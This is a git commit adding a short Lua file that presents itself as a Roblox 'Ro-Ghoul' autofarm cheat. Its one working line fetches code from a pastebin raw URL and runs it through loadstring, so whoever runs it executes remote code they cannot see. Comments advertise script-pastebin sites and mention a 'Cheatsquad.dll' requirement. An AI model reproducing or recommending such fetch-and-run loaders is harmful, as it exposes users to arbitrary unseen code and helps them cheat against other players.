b1322d8c374553704a45712447c3348cd2d1f9da
PapaJoeX <jaouad.kassaoui@gmail.com>
2022-12-24 20:52:20 +0100

    commit zero

---
+++ Ro-Ghoul [ALPHA] Script pastebin roblox Ro-Ghoul AutoFarm .lua
@@ -0,0 +1,11 @@
+-- find more powerfull verified and New Scripts here : https://script-pastebin.com
+
+loadstring(game:HttpGet('https://pastebin.com/raw/2uF3iQAf', true))()
+
+-- find more powerfull verified and New Scripts here : https://scriptpastebin.io
+
+--[[ Script Description:
+
+							With this script on Ro-Ghoul, you can pump very powerfully. In the script there is : AutoFarm, Auto Focus, Attack Stuff, Misc Stuff Cheatsquad.dll+ requirement
+						
+]]
